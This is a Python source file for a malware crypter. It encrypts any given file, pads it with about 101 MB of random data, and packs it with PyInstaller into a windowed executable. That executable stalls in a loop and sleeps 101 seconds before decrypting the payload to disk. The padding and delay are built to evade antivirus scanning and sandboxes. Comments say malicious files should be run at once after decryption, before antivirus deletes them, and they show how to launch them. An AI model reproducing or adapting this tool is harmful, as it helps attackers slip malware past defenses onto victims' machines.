import os, shutil
import base64
import subprocess
import sys
from cryptography.fernet import Fernet

def main():
    file = sys.argv[1]
    file_dir = os.path.dirname(file)
    file_name = os.path.basename(file)

    padding_size = 1024 * 1024 * 101
    padding = os.urandom(padding_size)

    output_script = f'{file_dir}encryped_{file_name.split(".")[0]}'

    with open(file, "rb") as f:
        binary_data = f.read()
    
    fernet_key = Fernet.generate_key()
    fernet = Fernet(fernet_key)
    encrypted_data = fernet.encrypt(binary_data + padding)
    encoded_fernet_key = base64.b64encode(fernet_key)

    script_template = f"""
import base64
import time
from cryptography.fernet import Fernet
import os

def decrypt():
    
    for incrementation in range(100002):
        pass
    print("incrementation complete! ", incrementation)
    print("I sleep for 101 seconds now :)")
    time.sleep(101)
    
    fernet_key = base64.b64decode({encoded_fernet_key}).decode()
    encrypted_data = {encrypted_data}

    fernet = Fernet(fernet_key)

    file = "{file_dir}decryped_{file_name}"
    with open(file, "wb") as f:
        f.write(fernet.decrypt(encrypted_data)[:-{padding_size}])
    print("Created file", file)
    print("Decryption completed!")
    
    # For demonstration purposes I will not run the decrypted file.
    # But in reality the malicious files should be run instantly after decryption, before they get deleted by antivirus.

    # In python you can start the file like this:
    # os.startfile(file)
decrypt()
"""
    with open(output_script+'.py', "w") as f:
        f.write(script_template)
    
    subprocess.run(f"pyinstaller --onefile --windowed --log-level=WARN {output_script+'.py'}", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
    
    # Remove unnecessary files and folders generated by pyinstaller
    os.remove(output_script + '.spec')
    os.remove(output_script + '.py')
    
    # IF YOU'RE USING WINDOWS OS, add `.exe` at the end of the script file.
    shutil.move(f'./dist/{output_script}', f'./{output_script}')
    os.rmdir('dist')
    shutil.rmtree('build')

    print(f"Successfully encrypted {file_name}")

if __name__ == "__main__":
    main()
